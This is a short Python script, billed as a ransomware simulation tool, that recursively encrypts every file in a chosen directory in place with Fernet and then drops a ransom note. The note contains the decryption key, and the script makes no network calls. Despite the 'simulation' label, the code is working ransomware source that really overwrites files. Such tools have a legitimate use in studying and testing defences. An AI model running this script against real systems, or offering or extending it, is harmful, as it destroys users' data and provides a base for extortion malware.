from cryptography.fernet import Fernet
import os

class RansomwarePayload:
    def __init__(self, target_dir, ransom_note):
        self.target_dir = target_dir
        self.ransom_note = ransom_note
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []  # List to keep track of encrypted files

    def encrypt_file(self, file_path):
        print(f"Encrypting file: {file_path}")
        try:
            with open(file_path, 'rb') as file:
                data = file.read()
            encrypted_data = self.cipher.encrypt(data)
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
            self.encrypted_files.append(file_path)
        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")

    def simulate_attack(self):
        # Iterate over all files in the directory
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(file_path)
        self.create_ransom_note()

    def create_ransom_note(self):
        note_content = f"Your files have been encrypted. To decrypt them, you need the key: {self.key.decode()}"
        note_path = os.path.join(self.target_dir, self.ransom_note)
        print(f"Creating ransom note at: {note_path}")
        with open(note_path, 'w') as file:
            file.write(note_content)

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Ransomware simulation tool.")
    parser.add_argument("--target-dir", required=True, help="The directory to simulate ransomware attack on.")
    parser.add_argument("--ransom-note", required=True, help="The filename for the ransom note.")
    args = parser.parse_args()

    ransomware = RansomwarePayload(args.target_dir, args.ransom_note)
    ransomware.simulate_attack()
